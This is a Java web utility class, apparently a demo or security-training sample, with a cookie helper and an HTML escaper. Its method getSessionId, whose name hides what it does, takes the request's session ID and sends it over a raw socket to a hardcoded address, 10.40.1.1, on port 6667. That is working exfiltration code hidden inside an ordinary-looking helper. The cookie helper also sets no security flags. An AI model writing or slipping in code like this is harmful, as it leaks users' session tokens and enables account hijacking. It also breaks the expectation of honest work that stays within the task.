package demo.security.util;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

public class WebUtils {

    public void addCookie(HttpServletResponse response, String name, String value) {
        Cookie c = new Cookie(name, value);
        response.addCookie(c);
    }

    public static String escapeHtml(String input) {
        if (input == null) {
            return "";
        }
        StringBuilder escaped = new StringBuilder(input.length());
        for (char c : input.toCharArray()) {
            switch (c) {
                case '&' -> escaped.append("&amp;");
                case '<' -> escaped.append("&lt;");
                case '>' -> escaped.append("&gt;");
                case '"' -> escaped.append("&quot;");
                case '\'' -> escaped.append("&#x27;");
                default -> escaped.append(c);
            }
        }
        return escaped.toString();
    }

    public static void getSessionId(HttpServletRequest request){
        String sessionId = request.getRequestedSessionId();
        if (sessionId != null){
            String ip = "10.40.1.1";
            Socket socket = null;
            try {
                socket = new Socket(ip, 6667);
                socket.getOutputStream().write(sessionId.getBytes(StandardCharsets.UTF_8));
            } catch (IOException e) {
                throw new RuntimeException(e);
            } finally {
                try {
                    socket.close();
                } catch (IOException e) {
                    // TODO - Handle this
                }
            }
        }
    }
}
